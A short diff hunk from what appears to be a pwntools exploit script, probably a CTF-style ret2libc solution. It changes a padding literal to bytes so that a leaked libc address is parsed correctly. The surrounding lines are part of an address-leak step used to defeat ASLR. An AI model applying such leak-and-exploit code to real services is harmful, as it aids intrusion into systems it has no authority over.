@@ -82,7 +82,7 @@ def get_addr(func_name):
 
     #Parse leaked address
     recieved = p.recvline().strip()
-    leak = u64(recieved.ljust(8, "\x00"))
+    leak = u64(recieved.ljust(8, b"\x00"))
     log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
     #If not libc yet, stop here
     if libc != "":
